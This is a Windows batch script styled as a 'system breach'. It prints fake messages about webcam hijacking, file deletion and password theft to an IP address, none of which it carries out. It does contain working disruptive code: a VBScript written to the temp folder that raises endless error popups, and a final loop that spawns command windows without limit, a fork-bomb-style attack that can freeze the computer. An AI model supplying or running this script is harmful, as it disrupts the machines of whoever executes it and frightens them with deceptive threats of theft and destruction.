@echo off
color 0C
title RED SKY - SYSTEM BREACH
mode 100

:: Step 1: Fake webcam hijack and file deletion
echo Initializing RED SKY protocol...
ping localhost -n 2 >nul
echo Accessing webcam... SUCCESS
ping localhost -n 1 >nul
echo Downloading facial data... OK
ping localhost -n 1 >nul
echo WARNING: System32 Access Granted
ping localhost -n 2 >nul
echo Deleting system core files...
ping localhost -n 2 >nul
echo [####.................] 25%%
ping localhost -n 1 >nul
echo [##########..........] 50%%
ping localhost -n 1 >nul
echo [##################..] 90%%
ping localhost -n 1 >nul
echo [####################] 100%%

:: Step 2: Create infinite popups (freeze illusion)
echo Set wshShell = CreateObject("WScript.Shell") > %temp%\freeze.vbs
echo Do >> %temp%\freeze.vbs
echo wshShell.Popup "FATAL ERROR: SYSTEM LOCKDOWN",1,"Windows Security",16 >> %temp%\freeze.vbs
echo Loop >> %temp%\freeze.vbs
start "" wscript.exe %temp%\freeze.vbs

:: Step 3: Fake password theft
echo Extracting stored credentials...
ping localhost -n 2 >nul
echo [Gmail] root@gmail.com | pass: *********
echo [Instagram] @user_yt | pass: ********
echo [Windows Login] %username% | pass: ********
ping localhost -n 1 >nul
echo Sending to 94.204.33.53:1337...
ping localhost -n 1 >nul

:: Step 4: Infinite CMD virus explosion
:explosion
start cmd /k echo SYSTEM DESTROYED & exit
goto explosion
